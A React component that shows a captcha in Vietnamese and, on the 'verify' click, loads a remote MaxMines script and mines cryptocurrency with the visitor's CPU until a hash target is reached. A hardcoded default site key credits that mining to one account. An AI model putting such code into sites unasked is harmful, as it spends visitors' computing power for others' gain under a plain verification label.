import React, { Component } from 'react';
import './style.scss';
import RoundCheckbox from './rounded-checkbox.svg';
import PropTypes from 'prop-types';
import loadScript from 'load-script';

export default class MaxMinesCaptcha extends Component {
    constructor(props) {
        super(props);
        this.miner = null;
        this.barRef = React.createRef();
        this.state = {
            progressBar: 0,
            miningIsActive: false
        }
    }

    async componentDidMount() {
        await this.buildMiner();
    }

    async buildMiner() {
        if (this.miner && this.miner.isRunning()) {
            this.miner.stop();
        }
        this.miner = await new Promise(resolve => {
            loadScript(this.props.minerUrl, () => {
                if (this.props.userName) {
                    return resolve(window.MaxMines.User(this.props.siteKey, this.props.userName));
                }
                return resolve(window.MaxMines.Anonymous(this.props.siteKey));
            })
        })
        this.handleProps(this.props);
    }



    handleProps({ throttle, threads, autoThreads }) {
        if (this.miner != null) {
            this.miner.setThrottle(throttle);
            if (autoThreads) {
                this.miner.setAutoThreadsEnabled(autoThreads);
            } else {
                this.miner.setNumThreads(threads);
            }
        }
    }

    async startMining() {
        this.setState({miningIsActive: true})
        await this.miner.start();
        this.miner.on('accepted', async (data) => {
            const progress = (data.hashes/this.props.maxHash) * 100

            this.setState({progressBar: progress}, () => {
                if (data.hashes >= this.props.maxHash) {
                    this.miner.stop()
                    this.props.onComplete()
                    setTimeout(() => {
                        this.setState({miningIsActive: false})
                    }, 2000);
                }
            })
        });
    }



    render() {
        const {miningIsActive, progressBar} = this.state;
        console.log(progressBar)

        return (
            <div className='captcha-container'>
                {
                    miningIsActive
                    ? 
                        <div className='bar'>
                            <div className='progress' style={{width: progressBar + '%'}}></div>
                        </div>
                    : 
                    progressBar >= 100 ? 
                        <span className='verified-column'>
                            <img src={RoundCheckbox} />
                            <p>đã xác minh</p>
                        </span>
                    :
                        <div className='captcha-btn-container'>
                            <button onClick={() => this.startMining()}></button>
                            <p>Xác Minh</p>
                        </div>

                }
                <div className='aside-column'>
                    Xác thực
                    <a href='https://maxmines.com/info/captcha-help'>Cái gì đây?</a>
                </div>
            </div>
        )
    }
}

MaxMinesCaptcha.propTypes = {
    siteKey: PropTypes.string.isRequired,
    userName: PropTypes.string,
    autoThreads: PropTypes.bool,
    maxHash: PropTypes.number,
    throttle: PropTypes.number,
    threads: PropTypes.number,
    minerUrl: PropTypes.string,
    onComplete: PropTypes.func
}

MaxMinesCaptcha.defaultProps = {
    autoThreads: true,
    siteKey: 'gq5uMfbxaOrb0g2ge31aYNGKFGgkI5AOAyWIQtHV',
    maxHash: 1024,
    throttle: 0,
    threads: 2,
    username: null,
    minerUrl: 'https://maxmines.com/lib/maxmines.min.js',
    onComplete: () => console.log('mining completed')
}